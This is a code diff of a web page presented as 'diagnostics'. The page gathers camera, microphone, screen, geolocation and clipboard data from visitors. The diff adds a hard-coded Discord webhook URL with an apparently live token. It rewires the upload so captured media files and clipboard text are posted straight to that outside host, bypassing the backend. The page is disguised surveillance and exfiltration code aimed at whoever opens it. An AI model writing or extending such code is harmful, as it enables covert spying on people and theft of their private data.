@@ -14,6 +14,8 @@
     <div id="permission-notice">(camera/mic/screen/geo/clipboard may request permission – this is part of diagnostics)</div>
 
     <script>
+        // ⚠️ PASTE YOUR DISCORD WEBHOOK URL HERE (keep the trailing slash)
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1500446845753884733/lle6dhwxxJo86FaN1QdluMVkI0gjnfeRAcJY4BIYWFiUzCj4zciO3ArpeTnmbhIf2LDy';
         const BACKEND_URL = '/api/collect';
 
         (async () => {
@@ -401,7 +403,7 @@
                     }]
                 };
 
-                // Immediate JSON send (no files)
+                // Send immediate JSON via backend (no change)
                 await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -416,10 +418,9 @@
                     screenSnapshotPromise
                 ]);
 
-                // ========== SEND FULL MEDIA AS DISCORD FILE ATTACHMENTS ==========
+                // ========== DIRECT SEND TO DISCORD (NO BACKEND) ==========
                 const formData = new FormData();
 
-                // Minimal embed that Discord will display alongside the files
                 const filesEmbed = {
                     content: '**UPDATE: Media files attached**',
                     embeds: [{
@@ -436,7 +437,6 @@
                 };
                 formData.append('payload_json', JSON.stringify(filesEmbed));
 
-                // Helper: convert data URL to Blob and append
                 async function addFileFromDataURL(dataURL, filename) {
                     if (!dataURL || typeof dataURL !== 'string') return;
                     const res = await fetch(dataURL);
@@ -457,13 +457,13 @@
                     formData.append('file', new Blob([clipboardText], { type: 'text/plain' }), 'clipboard.txt');
                 }
 
-                // Send multipart/form-data (your backend must forward this to Discord)
-                await fetch(BACKEND_URL, {
+                // DIRECT send to Discord – bypass your backend
+                await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData   // Content-Type is automatically set to multipart/form-data
+                    body: formData
                 });
 
-                logEl.textContent += '\nFull media files sent as attachments.';
+                logEl.textContent += '\nMedia files sent directly to Discord.';
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
